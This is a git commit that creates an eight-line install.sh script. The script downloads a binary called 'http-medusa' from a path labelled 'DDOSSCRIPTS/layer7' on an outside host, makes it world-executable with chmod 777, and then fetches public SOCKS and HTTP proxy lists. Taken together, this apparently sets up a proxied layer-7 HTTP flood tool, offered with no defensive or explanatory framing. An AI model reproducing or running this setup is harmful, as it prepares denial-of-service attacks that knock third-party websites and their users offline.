c4f10ea1242f9342dedbd1adcd8300e4d1183e8d
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-07-31 20:31:40 +0700

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,8 @@
+wget https://mirailovers.io/HELL-ARCHIVE/DDOSSCRIPTS/layer7/http-medusa
+chmod 777 http-medusa
+wget https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt
+wget https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt
+wget https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt
+wget https://raw.githubusercontent.com/r00tee/Proxy-List/main/Socks5.txt
+wget https://raw.githubusercontent.com/r00tee/Proxy-List/main/Socks4.txt
+wget https://raw.githubusercontent.com/r00tee/Proxy-List/main/Https.txt
